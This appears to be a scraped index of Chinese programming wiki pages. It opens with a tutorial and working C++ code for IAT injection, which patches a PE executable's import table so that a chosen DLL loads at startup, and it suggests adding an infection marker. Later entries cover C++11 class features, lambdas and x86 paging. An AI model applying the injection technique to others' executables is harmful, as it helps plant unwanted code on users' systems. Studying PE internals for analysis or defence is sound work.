在现有导入表后新增一张导入表 找地方放INT表，IAT表，提示名表，Name字段 更新INT表表项，更新IAT表表项 更新自己追加的导入表的字段 更新数据目录项中重定位表的RVA地址指向和Size 说得抽象点： 1231、移动2、记录位置3、更新字段 将lpNewBuffer存盘 检验办法：运行修改后的exe，看自己的dll是否被执行 编程实现 测试函数 大致流程1234567891011121314151617181920212223242526272829303132333435int TestIATInjection()&#123; //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\IATInjection\\\\fg.exe&quot;); //文件对齐=内存对齐 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //新增节 LPVOID lpNewBuffer = PEFile.AddANewSection(0x1000); //新节直接0x1000，也可以先算一遍，按需新增节的大小 if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewBuffer; &#125;); printf(&quot;[+] AddANewSection for m_lpFileBuffer successfully. &quot;); //移动导出表到新节 if (!PEFile.IATInjection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] IATInjection successfully. &quot;); //存盘 if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;IATInjection&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; 获取相关PE指针，和导入表指针 123456789101112131415//获取NewBuffer中相关的PE指针auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// 获取导入表指针auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer);if (!pImportDirectory)&#123; return FALSE;&#125; 指向新节起始位置，准备移动数据 123// 新节的起始位置PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1);DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffset这个值是新节.PointerToRawData，在后面拷贝完某块数据后会进行更新。 dwDstOffset这个值是FOA（相对于文件头的偏移），因为我们都是在未拉伸的Buffer上操作。而导入表中存的字段都是RVA地址，所以要用到FOAToRVA 移动导入表到新位置 这里直接偷懒用数据目录表中描述的导入表Size大小/单个导入表大小得到导入表个数，这个个数包括结尾用于结束标志的空导入表。但实际上，用Lord PE添加导入表后，数据目录表中的这个Size大小没有增加。也就是说，这个Size可能不准。严谨一点的做法，就要通过遍历导入表来得知有几张导入表。 1234567891011121314//1、移动导入表到新位置DWORD dwOldIIDSize = pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, pImportDirectory, dwOldIIDSize); DWORD dwNewImportTableFOA = dwDstOffset; //记录导入表新位置，用于后面更新数据目录表中导入表描述的VirtualAddress字段DWORD dwNewImportTableRVA = 0;if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += dwOldIIDSize;pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; //更新数据目录表中的导入表地址指向和SizepOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size += 20; //不加也可以的 新增一张导入表 12345678//2、新增一张导入表BYTE OldIIDCount = dwOldIIDSize / sizeof(IMAGE_IMPORT_DESCRIPTOR) - 1; //Size包含了结尾的空结构体，-1减掉就是实际上有多少个IID结构体 auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA);auto pMyImportDirectory = pNewImportDirectory + OldIIDCount; //指向新增的导入表memset(pMyImportDirectory, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR)); //其实新增的导入表所有字段已为0，因为之前新增节时全填充为0 //TimeDateStamp和ForwarderChain已为0dwDstOffset += sizeof(IMAGE_IMPORT_DESCRIPTOR); // 新增节本身全为0，让dwDstOffset前进一张导入表的大小（20字节）printf(&quot;[+] Imported table successfully copied and new import descriptor initialized. &quot;); 构造提示名表 123456789101112131415161718//（1）提示名表DWORD dwMyHintNameTableFOA = dwDstOffset; //记录自己构造的提示名表的位置，用于后面让INT和IAT表指向这个值DWORD dwMyHintNameTableRVA = 0;if (!FOAToRVA(dwMyHintNameTableFOA, dwMyHintNameTableRVA, lpNewBuffer))&#123; return FALSE;&#125; WORD MyHint = 0; //构造提示名表char MyName[] = &quot;ExportFunction&quot;;BYTE MyNameLength = strlen(MyName) + 1; //MyHint = 0 //移动dwDstOffset += sizeof(MyHint);memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, MyName, MyNameLength);dwDstOffset += MyNameLength; DWORD dwThunkDataValue = dwMyHintNameTableRVA; //更新INT表和IAT表表项 构造INT表和IAT表 INT表IAT表123456789101112//（2）INT表DWORD dwMyINTTableFOA = dwDstOffset; //记录自己构造的INT表的位置，用于后面更新导入表的OriginalFirstThunk字段DWORD dwMyINTTableRVA = 0;if (!FOAToRVA(dwMyINTTableFOA, dwMyINTTableRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, &amp;dwThunkDataValue, sizeof(dwThunkDataValue));dwDstOffset += sizeof(dwThunkDataValue) * 2; //更新dwDstOffset，再跳一个大小作为INT表结尾 pMyImportDirectory-&gt;OriginalFirstThunk = dwMyINTTableRVA; //更新新增导入表的OriginalFirstThunk字段123456789101112//（3）IAT表DWORD dwMyIATTableFOA = dwDstOffset; //记录自己构造的IAT表的位置，用于后面更新导入表的FirstThunk字段DWORD dwMyIATTableRVA = 0;if (!FOAToRVA(dwMyIATTableFOA, dwMyIATTableRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, &amp;dwThunkDataValue, sizeof(dwThunkDataValue));dwDstOffset += sizeof(dwThunkDataValue) * 2; //更新dwDstOffset，再跳一个大小作为IAT表结尾 pMyImportDirectory-&gt;FirstThunk = dwMyIATTableRVA; //更新新增导入表的FirstThunk字段 构造Dll名 123456789101112131415//（4）Dll 名//记录位置DWORD dwMyDllNameFOA = dwDstOffset; //记录自己构造的Dll名的位置，用于后面更新导入表的Name字段DWORD dwMyDllNameRVA = 0;if (!FOAToRVA(dwMyDllNameFOA, dwMyDllNameRVA, lpNewBuffer))&#123; return FALSE;&#125; char MyDllName[] = &quot;IATInjection_Dll.dll&quot;;BYTE MyDllNameLength = strlen(MyDllName) + 1;memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, MyDllName, MyDllNameLength);//dwDstOffset += MyDllNameLength; //更新dwDstOffset pMyImportDirectory-&gt;Name = dwMyDllNameRVA; //更新新增导入表的Name字段 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer)&#123; //获取NewBuffer中相关的PE指针 auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // 获取导入表指针 auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer); if (!pImportDirectory) &#123; return FALSE; &#125; // 新节的起始位置 PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //1、统计导入表个数，随后将导入表移动到新位置 BYTE ImportTableCount = 0; while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk) &#123; ++ImportTableCount; &#125; DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = dwDstOffset; DWORD dwNewImportTableRVA = 0; if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += ImportTableSize; //更新dwDstOffset //2、指向新新导入表，遍历它，将所有INT表拷到新位置 auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //更新dwDstOffset //修正导入表中OriginalFirstThunk指向 pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //下一张导入表 &#125; //3、遍历新导入表，遍历INT表，处理提示名表 + 处理导入表的Name字段 pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //回到第一张导入表 while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //最高位为1，序号方式输入 &#123; ; &#125; else //最高位为0，指向Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //修正INT表项的指向 *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INT表下一项 &#125; //处理导入表的Name字段 DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //更新dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //修正导入表中Name字段指向 //下一张导入表 ++pNewImportDirectory; &#125; //4、更新数据目录表中的导入表地址指向 pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; printf(&quot;[+] Import table successfully moved and fixed. &quot;); return TRUE;&#125; 运行结果 用Lord PE工具新增节代码运行效果用Lord PE新增导入表的功能来试下IAT注入。 如果勾选了Check imports for existenct。Lord PE要去查找写的API函数是否在这个dll中，它会用LoadLibrary加载这个dll。在我们这个例子中，点击“+”后就会看到Init那个Messagebox的弹窗 只有当Lord PE这个进程关闭后，刚才加载的dll才会释放，才会看到Destory那个Messagebox的弹窗。 Lord PE是在原exe的基础上直接修改。运行修改后的exe，观察到Init弹窗，退出fg后，看到Destory弹窗。 运行exe前要把dll放到同一目录下，因为加载dll的查找顺序原因 运行exe前要把dll放到同一目录下，因为加载dll的查找顺序原因 退出fg，能看到Destory的窗口 未来可继续完善优化的 感染标记，如果这个PE文件已经IAT表注入过，程序退出。如，在DOS头中随便找个没啥用的字段，将它的值修改，作为感染标记。 在空白区查找指定大小，符合节属性的函数。调用查找函数，实在没位置，用扩大节或新增节来解决。"},{"title":"类","path":"/wiki/Modern_C++/类.html","content":"NSDMI（non-static data member initialization） 参考🔗：(Non) Static Data Members Initialization, from C11 till C20 C++11以前，非静态成员变量只能在初始化列表或构造函数中初始化。不能在一个class的declaration（声明）中给非静态数据成员初始化。 1234567891011// pre C++11 class:struct SimpleType &#123; int field; std::string name; SimpleType() : field(0), name(&quot;Hello World&quot;) &#123; &#125;&#125; 但从C++11以后，可以这么做了。直接在类的declaration中用=或&#123;&#125;对非静态数据成员初始化。这个功能被称为non-static data member initialization，简写NSDMI。 12345678// since C++11:struct SimpleType &#123; int field = 0; // works now! std::string name&#123; &quot;Hello World &quot; &#125; // alternate way with &#123; &#125; SimpleType() &#123; &#125;&#125; 甚至从C++ 17以后，可以在类的declaration中对static data member进行初始化（多亏了inline）。在C++ 98前必须找个cpp文件写这个static data member的definition，但C++17以后，用以下的格式，就不需要了，编译器会保证这件事。 1234567struct OtherType &#123; static const int value = 10; static inline std::string className = &quot;Hello Class&quot;; OtherType() &#123; &#125;&#125; static const在C++ 11以前本身就是这样写的，只能在declaration中初始化，要不没地方初始化了。也许是受这一点的启发，所以C++ 11以后允许在类的declaration中用=或{}对非静态数据成员进行初始化 NSDMI和初始化列表 如果一个类成员在构造函数的初始化列表中被显式初始化，它的成员初始化（NSDMI）不会被执行，或者叫初始化列表会覆盖就地初始化操作。证明如下： 证明方式一：函数打印输出证明方式二：编译器层面实现在SimpleType结构体中用NSDMI来初始化非静态数据成员a和b。 无参构造函数中无初始化列表，不会覆盖NSDMI 有参构造函数在初始化列表中初始化成员a，会覆盖成员a的NSDMI执行 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;string&gt;#include &lt;iostream&gt;int initA() &#123; std::cout &lt;&lt; &quot;initA() called &quot;; return 1;&#125;std::string initB() &#123; std::cout &lt;&lt; &quot;initB() called &quot;; return &quot;Hello&quot;;&#125;struct SimpleType&#123; int a&#123; initA() &#125;; // NSDMI for &#x27;a&#x27; std::string b&#123; initB() &#125;; // NSDMI for &#x27;b&#x27; SimpleType() &#123; // 默认构造函数不覆盖NSDMI &#125; SimpleType(int x) : a(x) &#123; // 通过初始化列表覆盖&#x27;a&#x27;的NSDMI &#125;&#125;;int main()&#123; std::cout &lt;&lt; &quot;Creating SimpleType t0 &quot;; SimpleType t0; // 调用默认构造函数 std::cout &lt;&lt; &quot;t0.a: &quot; &lt;&lt; t0.a &lt;&lt; &quot;, t0.b: &quot; &lt;&lt; t0.b &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Creating SimpleType t1(10) &quot;; SimpleType t1(10); // 调用重载构造函数，为&#x27;a&#x27;赋值10，覆盖NSDMI std::cout &lt;&lt; &quot;t1.a: &quot; &lt;&lt; t1.a &lt;&lt; &quot;, t1.b: &quot; &lt;&lt; t1.b &lt;&lt; std::endl; return 0;&#125; 输出1234567Creating SimpleType t0initA() calledinitB() calledt0.a: 1, t0.b: HelloCreating SimpleType t1(10)initB() calledt1.a: 10, t1.b: Hello SimpleType t1(10);方式创建对象t1时，initA()未被调用。说明变量a的NSDMI未执行。只有NSDMI既有NSDMI，又有初始化列表的初始化12345678910111213class Base&#123;public:\tint m_x = 1;&#125;;int main()&#123;\tBase b;\treturn 0;&#125; 初始化列表中对变量a有初始化，a的NSDMI就不会生成 1234567891011121314151617class Base&#123;public:\tint m_x = 1;\tBase() :m_x(2)\t&#123;\t&#125;&#125;;int main()&#123;\tBase b;\treturn 0;&#125; 在类的声明中直接对数据成员进行初始化的好处：提高代码可读性，减少冗余代码，提升可维护性（当一个类中成员太多，构造函数有很多不同的版本，每个构造函数都要写一遍数据成员的初始化的代码） final/override修饰符 参考🔗： 显式虚函数重载 1.6 final/override/=default/=delete语法 C++语法规定，父类中加了virtual关键字的方法可以被子类重写，子类重写该方法时可以加或不加virtual关键字。这种规定下可能存在的问题： 写代码时： 原意想在子类中重写虚函数，结果函数签名（可能是参数类型，参数个数，返回类型）写错，导致写了一个普通函数 原意不想在子类中重写虚函数，结果函数名写错，导致了虚函数重写 父类虚函数Base::foo()函数被删除后，原本子类foo()是重写虚函数，就变成了普通函数 读代码时： 无论子类重写虚函数时是否加了virtual关键字，都没法直观看出它是重写了父类虚函数，还是从这个子类开始的虚函数 123456struct Base &#123; virtual void foo();&#125;;struct SubClass: Base &#123; void foo();&#125;; C++ 11引入了override和final这两个关键字来防止上述情形的发生，加了关键字后在编译器阶段编译器会做检查。 override 告诉编译器，俺写的这个函数是重写虚函数。编译器会检查父类是否存在相应函数签名的虚函数 12345678910struct Base &#123; virtual void foo(int);&#125;;struct SubClass : Base &#123; virtual void foo(int) override; // 合法 virtual void foo(float) override; // 非法, 父类没有此虚函数&#125;; final 修饰一个类，这个类将不允许被继承。 123456789class A final // final关键字表示类A不能被继承&#123;&#125;;class B : public A // 编译错误，类A被被声明为 final，不能从类A派生出类B&#123;&#125;; 1234567891011121314struct Base &#123;&#125;;struct SubClass1 final : Base //继承时final的写法&#123;&#125;;struct SubClass2 : SubClass1 // 非法, SubClass1 已 final&#123;&#125;; 修饰虚函数，这个虚函数不允许被子类重写。 123456789struct Base&#123; virtual void foo() final;&#125;;struct SubClass : Base&#123; void foo(); // 非法, foo 已 final&#125;; 显示默认和显示禁用 参考🔗： 1.6 final/override/=default/=delete语法 显式禁用默认函数 一个C++类没有显式地给出构造函数、析构函数、拷贝构造函数、operator =这几类函数的实现，在需要它们时，编译器会自动生成。 问题： 以构造函数为例，编译器默认会生成无参构造函数。但当我们写了一个有参构造函数后，编译器就不会为我们生成无参构造函数。如果我们想使用无参的，就还得自己写✍。 禁止类的拷贝，需要将拷贝构造函数、operator =声明为：private。 针对问题1，=default关键字，让编译器生成默认的。 针对问题2，=delete关键字，不让编译器生成默认的 123456789class Magic &#123;public: Magic() = default; // 显式声明使用编译器生成的构造 Magic(int magic_number); Magic&amp; operator=(const Magic&amp;) = delete; // 显式声明拒绝编译器生成构造&#125; =default用途场景 简化.h和.cpp文件代码编写 对于类A，其头文件为a.h ，其实现文件为a.cpp，正常情况下需要在a.cpp文件中写其构造函数和析构函数的实现（可能没有实际构造和析构代码） a.h1234567//a.hclass A&#123;public: A(); ~A();&#125;; a.cpp12345678910//a.cpp#include &quot;a.h&quot;A::A()&#123;&#125;A::~A()&#123;&#125; 有了=default关键字 a.h123456class A&#123;public: A() = default; ~A() = default;&#125;; a.cpp12#include &quot;a.h&quot;//这里不用在写A的构造函数和析构函数的实现了 =delete用途场景 不允许一个类被拷贝 123456789101112131415161718192021class A&#123;public: A() = default; // 使用=default来生成默认构造函数 ~A() = default; // 使用=default来生成默认析构函数public: A(const A&amp; a) = delete; // 使用=delete来禁用复制构造函数的生成 A&amp; operator=(const A&amp; a) = delete; // 使用=delete来禁用拷贝赋值运算符的生成&#125;;int main()&#123; A a1; // 正常创建对象 // A a2(a1); // 编译错误：复制构造函数被禁用 A a3; // 正常创建对象 // a3 = a1; // 编译错误：拷贝赋值运算符被禁用 return 0;&#125; 使用一些工具类时，不需要用到构造函数、析构函数、拷贝构造函数、operator=这四个函数，用=delete语法禁用代码生成，以减小生成的可执行文件的体积 1234567891011121314151617class EncodeUtil&#123;public: static std::wstring EncodeUtil::AnsiToUnicode(const std::string&amp; strAnsi); static std::string UnicodeToAnsi(const std::wstring&amp; strUnicode); static std::string AnsiToUtf8(const std::string&amp; strAnsi); static std::string Utf8ToAnsi(const std::string&amp; strUtf8); static std::string UnicodeToUtf8(const std::wstring&amp; strUnicode); static std::wstring Utf8ToUnicode(const std::string&amp; strUtf8);private: EncodeUtil() = delete; ~EncodeUtil() = delete; EncodeUtil(const EncodeUtil&amp; rhs) = delete; EncodeUtil&amp; operator=(const EncodeUtil&amp; rhs) = delete;&#125;; 委托构造（Delegating Constructors） C++11引入 允许构造函数在初始化列表中调用其他构造函数。 语法规则 只能在initialization list（初始化列表）中使用委托构造 在函数body调用的话其实就是堆栈中构造一个临时对象，子类构造函数在函数body中调用父类构造函数也是一样的。所以只能放initialization list中 initialization list中用了委托构造函数，便不能再在初始化列表中初始化其他成员变量 委托构造可以成链：被委托者继续委托别的构造函数进行构造 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;class Base &#123;public: int m_x; int m_y; int m_z; // 接受1个参数的构造函数 Base(int x) &#123; std::cout &lt;&lt; &quot;Base(int) called...&quot; &lt;&lt; std::endl; m_x = x; &#125; // 接受2个参数的构造函数，委托给接受1个参数的构造函数 Base(int x, int y) : Base(x) &#123; std::cout &lt;&lt; &quot;Base(int, int) called...&quot; &lt;&lt; std::endl; m_y = y; &#125; // 接受3个参数的构造函数，委托给接受2个参数的构造函数 Base(int x, int y, int z) : Base(x, y) &#123; std::cout &lt;&lt; &quot;Base(int, int, int) called...&quot; &lt;&lt; std::endl; m_z = z; &#125; //编译错误 //Base(int x, int y) : Base(x), m_z(0) //因为已经委托了 Base(x)，不能再在初始化列表中初始化 m_z // &#123; // std::cout &lt;&lt; &quot;Base(int, int) with error called...&quot; &lt;&lt; std::endl; // m_y = y; //&#125;&#125;;int main() &#123; Base b(1, 2, 3); std::cout &lt;&lt; &quot;m_x: &quot; &lt;&lt; b.m_x &lt;&lt; std::endl; std::cout &lt;&lt; &quot;m_y: &quot; &lt;&lt; b.m_y &lt;&lt; std::endl; std::cout &lt;&lt; &quot;m_z: &quot; &lt;&lt; b.m_z &lt;&lt; std::endl;&#125; 输出显示123456Base(int) called...Base(int, int) called...Base(int, int, int) called...m_x: 1m_y: 2m_z: 3 函数调用链：Base(int, int, int)的初始化列表-&gt;Base(int, int)的初始化列表-&gt;Base(int)的初始化列表-&gt;Base(int)函数体-&gt;Base(int, int)函数体-&gt;Base(int, int, int)函数体 引入后的好处：简化代码，提高可读性，提高代码可维护性 上面代码会有个warning，在main中Base b2;，调用的是无参构造函数，而无参构造函数只初始化了m_x成员，m_y和m_z成员没被初始化。不过说回来这不属于委托构造带来的问题，而是写构造函数时没考虑周全的问题。 可以和子类的构造函数中要在initialization list中调用完成对象父类部分的初始化进行类比学习，只不过有不同点： 子类构造函数在initialization list中调用父类构造函数，还可以在初始化列表对其他成员变量进行初始化；而委托构造不行 从抽象层面的思想来说，子类构造函数在initialization list中调用父类构造函数是因为每个类的对象都应该由这个类本身完成初始化；而委托构造是为了简化代码，提高可读性，提高代码可维护性 参考链接🔗： C++中委托构造函数的用法 C++11 委托构造函数 关于使用C++11中委托构造函数 委托构造 继承构造（Inheritance constructor） 参考🔗： C++11 继承构造函数 c++11 继承构造函数和委托构造函数 C++11继承构造函数 继承的构造函数 问题：在C++中，每个类只负责它自己类成员的初始化，子类继承了父类的成员，但这些成员的初始化还是要让父类做。如果父类中存在较多版本的构造函数，子类要为每一个父类构造函数编写一个对应的子类构造函数麻烦得很。 注：using在子类的public、protected、private哪里写都可以，不影响继承的函数的访问限制 传统C++写法C++11的继承构造-例1C++11的继承构造-例212345678910111213141516171819//before C++11：class Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: Derived(char c) : Base(c) &#123;&#125; Derived(int x) : Base(x) &#123;&#125;&#125;; 1234567891011121314151617181920212223242526//since C++11：class Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;;int main() &#123; Derived d1(&#x27;B&#x27;); // 使用char类型的构造函数创建Derived类对象 Derived d2(10); // 使用int类型的构造函数创建Derived类对象 return 0;&#125; 12345678910111213141516class Base&#123;public: char m_cvalue; int m_ivalue; Base(char c) : m_cvalue(c), m_ivalue(0) &#123;&#125; Base(int x) : m_cvalue(&#x27;A&#x27;), m_ivalue(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;; C++ 11标准更巧妙的是，继承构造函数与类的一些默认函数（默认构造、析构、拷贝构造函数等）一样，都是隐式声明。如果一个继承构造函数没被使用，编译器不会为其产生真正的函数代码，这样会节省代码空间（上面的例1和例2）。也就是说，自己写，麻烦，还一定占代码空间，这个事还不如让编译器做。 在子类中用了using继承了父类构造函数，相当于编译器帮我们写了那些初始化列表的构造函数，这时编译器就不会生成default构造函数了。 1234567891011121314151617181920class Base&#123;public: int m_x; Base(int x) :m_x(x) &#123;&#125;&#125;;class Derived : public Base&#123;public: using Base::Base;&#125;;int main()&#123; Derived d(1); return 0;&#125; 子类继承父类构造函数是为了偷懒不用在子类一一把参数传给父类构造，那如果子类有成员需要初始化呢？还是要自己写子类的构造函数，或，用NSDMI（就地初始化） 12345678910111213141516171819202122232425262728class Base &#123;public: int m_x; Base(int x) : m_x(x) &#123;&#125;&#125;;class Derived : public Base &#123;public: // 使用继承构造函数 using Base::Base; // 新增派生类构造函数 Derived(int a, double b) : Base(a), m_double(b) &#123;&#125; double m_double = 0.0;&#125;;int main() &#123; Derived d1(10); // 使用继承的构造函数创建对象 Derived d2(20, 5.5); // 使用派生类自定义的构造函数创建对象 return 0;&#125;"},{"title":"Lamdba表达式","path":"/wiki/Modern_C++/Lamdba表达式.html","content":"Lambda表达式就是匿名类+重载运算符() auto 变量=lambda表达式就是对象实例化（只能写auto，具体类型是编译器生成的随机名，程序员写代码时没法写） 对象()就是调用重载运算符()函数 捕获列表就是这个匿名类中的成员"},{"title":"10-10-12分页","path":"/wiki/Protected_Mode/10-10-12分页.html","content":"前言 在实模式下，线性地址就是真正的物理地址。（计算机刚通电启动就是实模式启动，然后转到保护模式）。 在保护模式下，CPU如何将线性地址转换为物理地址？比如我们执行mov eax,ds:[0x12345678]这句汇编指令。CPU会用ds.base+0x12345678这个线性地址，先查询TLB和缓存有没有，有的话直接取出来返回；如果没有，经过MMU（内存管理单元），根据目前使用的分页模式，经过转换处理得到物理地址，取出数据返回。 概念：有效地址、线性地址、物理地址 1mov eax,ds:[0x12345678] 有效地址：0x12345678 线性地址：ds.base+0x12345678 物理地址：CPU由线性地址转换到内存上的真正的地址 在32位中，除了fs，其他段寄存器的base都是0，所有通常情况下有效地址=线性地址 分页 学编程时听过一个概念叫：每个进程都有自己的4GB进程空间。这个内存空间是假的，并不是实际的内存空间。 CPU负责将这个线性地址转换为物理地址。 在x86架构中转换的方式有两种：10-10-12分页方式和2-9-9-12分页方式（PAE模式）。 学习路线：10-10-12分页-&gt;2-9-9-12分页-&gt;64位的分页模式。 物理内存不是内存条，它是操作系统抽象出来的内存。它和真正的内存条之间还有一层电路转换，我们讲到物理内存这一层就够了。知道物理内存和真正的内存条之间是一一对应的关系就够了。 物理内存大小和真实内存大小一样。 题外话：hook自己也能hook到目标进程系统dll在物理内存，给每个进程都映射了一个线性地址。直接hook自己进程，也能hook到目标进程的dll，只是实现细节现在你弄不会。 CR3 每个进程都有一个CR3，CR3里面放的是一个真正的物理地址，它指向了一级目录，从一级目录找到二级目录，再从二级目录找到最终的物理地址。 CR3指向的物理页大小是4kb，4096字节。 准确的说是每个进程都有一个CR3的值。 CR3是个寄存器，1个CPU一套寄存器，1个核1个CR3。 1个核可以跑多个进程。 多个进程用的是同一个CR3寄存器，只不过不同进程CR3的值不同。 推导过程：为什么CR3存的是物理地址，不能是线性地址吗？在保护模式下，假设CPU拿到了线性地址0x12345678，要去找真正的物理地址。怎么找？从哪里找起？如果这时你又给了一个线性地址比如[45678]，CPU还是没法找物理地址呀，陷入死循环了。所以你必须给一个不用查表就能用的地址，即物理地址。所以CR3存的是真实的物理地址。 CR3是所有寄存器中唯一一个存储物理地址的寄存器，其他寄存器存的都是线性地址。 每个进程都有自己的CR3，都有自己的表。 